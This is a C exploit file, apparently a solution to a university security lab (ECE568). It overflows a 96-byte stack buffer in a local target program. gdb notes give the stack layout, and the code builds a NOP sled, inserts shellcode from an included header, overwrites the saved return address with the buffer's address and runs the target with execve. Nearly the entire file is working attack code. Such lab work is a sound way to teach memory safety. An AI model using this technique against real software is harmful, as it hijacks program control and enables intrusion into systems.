#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#include "shellcode-64.h"

#define TARGET "../targets/target1"


/*
info from gdb

(gdb) info frame
Stack level 0, frame at 0x3021fed0:
 rip = 0x400bac in lab_main (target1.c:15); saved rip = 0x4009b8
 called by frame at 0x3021ff00
 source language c.
 Arglist at 0x3021fec0, args: argc=2, argv=0x7fffffffd418
 Locals at 0x3021fec0, Previous frame's sp is 0x3021fed0
 Saved registers:
  rbp at 0x3021fec0, rip at 0x3021fec8
(gdb) x 0x3021fec8
0x3021fec8:     0x004009b8
(gdb) p &buf
$2 = (char (*)[96]) 0x3021fe50

- buf is located at 0x3021fe50 to 0x3021feb0
- function return address: 0x004009b8 -> want to change this address to shellcode
- overwrite the data at the address 0x3021fec8
- we need a buf of size 0x3021fec8 - 0x3021fe50 = 0x78 == 120 bytes
- overwriting RA at buf[120]
- fill the beginning of the buf with NOP + Shellcode
*/

#define BUF_SIZE 128
#define NUM_NOP 8
#define RA_ADDR_OFFEST 120
#define NOP '\x90'
int main(int argc, char* argv[]) {
    char* args[3];
    char* env[1];

    /* ECE568 BEGIN */
	char attacker_string[BUF_SIZE];
    u_int32_t shellcode_length = sizeof(shellcode) / sizeof(shellcode[1]);
    printf("size of the shellcode: %d", shellcode_length);

    // fill begining with NOP
    int idx = 0;
    for (; idx < NUM_NOP; idx++) {
        attacker_string[idx] = NOP;
    }

    // fill with shellcode
    for (; idx < NUM_NOP + shellcode_length - 1; idx++) {
        attacker_string[idx] = shellcode[idx - NUM_NOP];
    }

    // fill rest with NOP
    for (; idx < RA_ADDR_OFFEST; idx++) {
        attacker_string[idx] = NOP;
    }

    // setting RA to 0x3021fe50
    attacker_string[RA_ADDR_OFFEST]     = '\x50';
    attacker_string[RA_ADDR_OFFEST + 1] = '\xfe';
    attacker_string[RA_ADDR_OFFEST + 2] = '\x21';
    attacker_string[RA_ADDR_OFFEST + 3] = '\x30';

    args[0] = TARGET;
    args[1] = attacker_string;
    args[2] = NULL;
    /* ECE568 END */

    env[0] = NULL;

    if (execve(TARGET, args, env) < 0)
        fprintf(stderr, "execve failed.\n");

    return (0);
}